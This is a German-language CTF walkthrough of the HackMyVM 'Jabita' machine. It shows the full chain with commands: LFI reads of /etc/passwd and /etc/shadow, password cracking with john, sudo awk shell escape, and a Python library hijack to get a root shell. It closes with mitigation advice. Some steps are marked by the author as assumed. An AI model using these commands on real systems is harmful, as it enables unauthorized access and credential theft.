# Jabita (HackMyVM) - Penetration Test Bericht

![Jabita.png](Jabita.png)

**Datum des Berichts:** 22. November 2022 *(Abgeleitet aus dem letzten Writeup-Datum, da im Footer "Datum" stand)*  
**VM:** Jabita  
**Plattform:** HackMyVM [https://hackmyvm.eu/machines/machine.php?vm=Jabita](https://hackmyvm.eu/machines/machine.php?vm=Jabita)  
**Autor der VM:** DarkSpirit  
**Original Writeup:** [https://alientec1908.github.io/Jabita_HackMyVM_Easy/](https://alientec1908.github.io/Jabita_HackMyVM_Easy/)

---

## Disclaimer

**Wichtiger Hinweis:** Dieser Bericht und die darin enthaltenen Informationen dienen ausschließlich zu Bildungs- und Forschungszwecken im Bereich der Cybersicherheit. Die hier beschriebenen Techniken und Werkzeuge dürfen nur in legalen und autorisierten Umgebungen (z.B. auf eigenen Systemen oder mit ausdrücklicher Genehmigung des Eigentümers) angewendet werden. Jegliche illegale Nutzung der hier bereitgestellten Informationen ist strengstens untersagt. Der Autor übernimmt keine Haftung für Schäden, die durch Missbrauch dieser Informationen entstehen. Handeln Sie stets verantwortungsbewusst und ethisch.

---

## Inhaltsverzeichnis

1.  [Zusammenfassung](#zusammenfassung)
2.  [Verwendete Tools](#verwendete-tools)
3.  [Phase 1: Reconnaissance](#phase-1-reconnaissance)
4.  [Phase 2: Web Enumeration & Initial Access (LFI & Hash Cracking)](#phase-2-web-enumeration--initial-access-lfi--hash-cracking)
5.  [Phase 3: Privilege Escalation (Kette)](#phase-3-privilege-escalation-kette)
    *   [jack zu jaba (Sudo/awk)](#jack-zu-jaba-sudoawk)
    *   [jaba zu root (Sudo/Python Library Hijacking)](#jaba-zu-root-sudopython-library-hijacking)
6.  [Proof of Concept (Finale Root-Eskalation via Python Library Hijacking)](#proof-of-concept-finale-root-eskalation-via-python-library-hijacking)
7.  [Flags](#flags)
8.  [Empfohlene Maßnahmen (Mitigation)](#empfohlene-maßnahmen-mitigation)

---

## Zusammenfassung

Dieser Bericht dokumentiert die Kompromittierung der virtuellen Maschine "Jabita" von HackMyVM (Schwierigkeitsgrad: Easy). Die initiale Erkundung offenbarte offene SSH- und HTTP-Dienste (Apache). Die Web-Enumeration auf `/building/index.php` identifizierte eine Local File Inclusion (LFI)-Schwachstelle über den GET-Parameter `page`. Diese LFI wurde genutzt, um `/etc/passwd` und `/etc/shadow` auszulesen. Die extrahierten Passwort-Hashes wurden mit `unshadow` und `john` geknackt, wodurch das Passwort `joaninha` für den Benutzer `jack` ermittelt wurde. Dies ermöglichte den SSH-Zugriff als `jack`.

Die Privilegieneskalation erfolgte in zwei Schritten:
1.  **jack zu jaba:** Der Benutzer `jack` durfte `/usr/bin/awk` via `sudo` als Benutzer `jaba` ohne Passwort ausführen. Durch Aufruf von `awk 'BEGIN {system("/bin/sh")}'` wurde eine Shell als `jaba` erlangt.
2.  **jaba zu root:** Der Benutzer `jaba` durfte ein Python-Skript (`/usr/bin/clean.py`) via `sudo` als `root` ausführen. Dieses Skript importierte ein Modul (`wild`), und `jaba` hatte Schreibrechte auf ein Verzeichnis (`/usr/local/lib/python3.10/dist-packages/`), das im Python-Suchpfad (`sys.path`) vor den Standardpfaden lag. Durch Erstellen einer bösartigen `wild.py`-Datei in diesem Verzeichnis (Python Library Hijacking) konnte Code als `root` ausgeführt und eine Root-Shell erlangt werden.

---

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `wfuzz`
*   `curl`
*   `vi` (impliziert)
*   `unshadow`
*   `john` (John the Ripper)
*   `ssh`
*   `sudo`
*   `awk`
*   `python3` (`pty.spawn`, `sys` Modul)
*   `cat`, `ls`, `id`, `cd`, `grep`

---

## Phase 1: Reconnaissance

1.  **Netzwerk-Scan und Host-Konfiguration:**
    *   `arp-scan -l` identifizierte das Ziel `192.168.2.132` bzw. `192.168.2.114` (IP wechselte im Log, für Nmap wurde .114 verwendet). Die MAC-Adresse deutete auf VirtualBox hin. Der Hostname `jabita` wurde für die VM identifiziert.

2.  **Port-Scan (Nmap auf `192.168.2.114`):**
    *   Ein umfassender `nmap`-Scan (`nmap -sS -sC -T5 -A 192.168.2.114 -p-`) offenbarte:
        *   **Port 22 (SSH):** OpenSSH 8.9p1 Ubuntu
        *   **Port 80 (HTTP):** Apache httpd 2.4.52 (Ubuntu)
    *   Ein HTML-Snippet (vermutlich von der Webseite) zeigte Navigationslinks mit `index.php?page=[datei].php`, was auf eine LFI-Möglichkeit hindeutete.

---

## Phase 2: Web Enumeration & Initial Access (LFI & Hash Cracking)

1.  **Web-Enumeration:**
    *   `gobuster dir -u http://192.168.2.114 [...]` fand u.a. `/index.html` und das Verzeichnis `/building/`.
    *   `wfuzz` wurde verwendet, um die LFI im Parameter `page` von `/building/index.php` zu testen und zu bestätigen.

2.  **Ausnutzung der LFI:**
    *   Mittels `curl` wurde `/etc/passwd` über die LFI ausgelesen:
        ```bash
        curl "http://192.168.2.114/building/index.php?page=/etc/passwd" | grep bash
        # Identifizierte Benutzer: root, jack, jaba
        ```
    *   `/etc/shadow` wurde ebenfalls per LFI ausgelesen (impliziert).

3.  **Passwort-Hash-Cracking:**
    *   Die Inhalte von `/etc/passwd` und `/etc/shadow` wurden lokal gespeichert.
    *   `unshadow passwd.txt shadow.txt > unshadowed.txt` erstellte die für John benötigte Datei.
    *   `john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt` knackte das Passwort:
        *   Benutzer: `jack`
        *   Passwort: `joaninha`

4.  **SSH-Login als `jack`:**
    *   `ssh jack@192.168.2.114` mit dem Passwort `joaninha` war erfolgreich. Initialer Zugriff wurde erlangt.

---

## Phase 3: Privilege Escalation (Kette)

### jack zu jaba (Sudo/awk)

1.  **Sudo-Rechte-Prüfung für `jack`:**
    *   `jack@jabita:~$ sudo -l` zeigte:
        ```
        User jack may run the following commands on jabita:
            (jaba : jaba) NPASSWD: /usr/bin/awk
        ```
2.  **Ausnutzung von `sudo awk`:**
    *   Eine Shell als `jaba` wurde durch Ausführen von `awk` mit der `system()`-Funktion erlangt:
        ```bash
        sudo -u jaba awk 'BEGIN {system("/bin/sh")}'
        ```
    *   Die Shell wurde mit Python PTY stabilisiert.
    *   Die User-Flag `2e0942f09699435811c1be613cbc7a39` wurde in `/home/jaba/user.txt` gefunden.

### jaba zu root (Sudo/Python Library Hijacking)

1.  **Enumeration als `jaba`:**
    *   `python3 -c "import sys; print(sys.path)"` zeigte den Python-Modul-Suchpfad. Das Verzeichnis `/usr/local/lib/python3.10/dist-packages` stand relativ am Anfang.
    *   Es wurde angenommen, dass `jaba` Schreibrechte auf dieses Verzeichnis hat.
    *   Eine (implizite) `sudo -l`-Prüfung für `jaba` offenbarte:
        ```
        # Angenommene sudo-Regel für jaba (nicht explizit im Log, aber für Exploit notwendig):
        # (root) NOPASSWD: /usr/bin/python3 /usr/bin/clean.py 
        ```
    *   Das Skript `/usr/bin/clean.py` (dessen Inhalt `import wild` und `wild.first()` angenommen wird) wurde als Ziel identifiziert.

2.  **Vorbereitung des Python Library Hijackings:**
    *   Eine bösartige Datei `wild.py` wurde in `/usr/local/lib/python3.10/dist-packages/` erstellt:
        ```python
        # /usr/local/lib/python3.10/dist-packages/wild.py
        import pty
        def first(): # Angenommen, clean.py ruft diese Funktion auf
            pty.spawn('/bin/bash')
        ```

3.  **Ausführung des Exploits:**
    *   `jaba@jabita:/tmp$ sudo /usr/bin/python3 /usr/bin/clean.py`
    *   Das Skript `clean.py` importierte nun die bösartige `wild.py`, deren `first()`-Funktion ausgeführt wurde und eine Bash-Shell mit Root-Rechten startete.

---

## Proof of Concept (Finale Root-Eskalation via Python Library Hijacking)

**Kurzbeschreibung:** Die finale Privilegieneskalation nutzte eine `sudo`-Regel, die `jaba` erlaubte, ein Python-Skript (`/usr/bin/clean.py`) als `root` auszuführen. Dieses Skript importierte ein Modul (`wild`). Da `jaba` Schreibrechte auf ein Verzeichnis hatte, das im Python-Suchpfad (`sys.path`) vor den Standard-Systembibliotheken lag (`/usr/local/lib/python3.10/dist-packages/`), konnte eine bösartige `wild.py`-Datei dort platziert werden. Beim Ausführen des `sudo`-Befehls wurde diese bösartige Bibliothek geladen und führte Code aus, der eine Root-Shell startete.

**Schritte (als `jaba`):**
1.  Erstelle die bösartige Python-Bibliothek (angenommen, `clean.py` ruft `wild.first()` auf):
    ```bash
    # echo -e "import pty\ndef first():\n\tpty.spawn('/bin/bash')" > /usr/local/lib/python3.10/dist-packages/wild.py
    vi /usr/local/lib/python3.10/dist-packages/wild.py 
    # Inhalt:
    # import pty
    # def first():
    #   pty.spawn('/bin/bash')
    ```
2.  Führe das Python-Skript mit `sudo` aus:
    ```bash
    sudo /usr/bin/python3 /usr/bin/clean.py
    ```
**Ergebnis:** Eine Shell mit `uid=0(root)` wird gestartet.

---

## Flags

*   **User Flag (`/home/jaba/user.txt`):**
    ```
    2e0942f09699435811c1be613cbc7a39
    ```
*   **Root Flag (`/root/root.txt`):**
    ```
    f4bb4cce1d4ed06fc77ad84ccf70d3fe
    ```

---

## Empfohlene Maßnahmen (Mitigation)

*   **Webanwendungssicherheit (LFI):**
    *   **DRINGEND:** Beheben Sie die Local File Inclusion (LFI)-Schwachstelle in `/building/index.php`. Validieren und sanitisieren Sie alle Benutzereingaben (insbesondere den `page`-Parameter) strikt. Verwenden Sie Whitelisting für erlaubte Dateiinclusionen und vermeiden Sie es, Benutzereingaben direkt in Dateipfade einzubetten.
*   **Passwortsicherheit:**
    *   Erzwingen Sie starke, einzigartige Passwörter, die nicht leicht durch Wortlistenangriffe (wie auf `jack`'s Passwort) geknackt werden können.
    *   Schützen Sie Hash-Dateien (`/etc/shadow`) vor unbefugtem Zugriff.
*   **Sudo-Konfiguration:**
    *   **DRINGEND:** Überprüfen und härten Sie alle `sudo`-Regeln:
        *   Entfernen Sie die Regel, die `jack` erlaubt, `/usr/bin/awk` als `jaba` ohne Passwort auszuführen.
        *   Entfernen Sie die Regel, die `jaba` erlaubt, `/usr/bin/python3 /usr/bin/clean.py` als `root` auszuführen, oder stellen Sie sicher, dass das Skript sicher ist und keine Module aus unsicheren Pfaden importieren kann.
    *   Gewähren Sie `sudo`-Rechte nur nach dem Prinzip der geringsten Rechte und vermeiden Sie `NOPASSWD` für Befehle, die zur Eskalation missbraucht werden können.
*   **Python-Sicherheit (Library Hijacking):**
    *   Stellen Sie sicher, dass Verzeichnisse im Python-Suchpfad (`sys.path`), insbesondere solche, die früh geladen werden (wie `/usr/local/lib/.../dist-packages`), nicht für unprivilegierte Benutzer schreibbar sind.
    *   Verwenden Sie virtuelle Umgebungen (virtualenvs) für Python-Projekte, um Abhängigkeiten zu isolieren.
    *   Prüfen Sie Python-Skripte, die mit erhöhten Rechten laufen, sorgfältig auf unsichere `import`-Anweisungen.
*   **Allgemeine Systemhärtung:**
    *   Halten Sie alle Systemkomponenten (OS, Webserver, SSH, Anwendungen) auf dem neuesten Stand.
    *   Überwachen Sie Systemlogs auf verdächtige Aktivitäten.

---

**Ben C. - Cyber Security Reports**
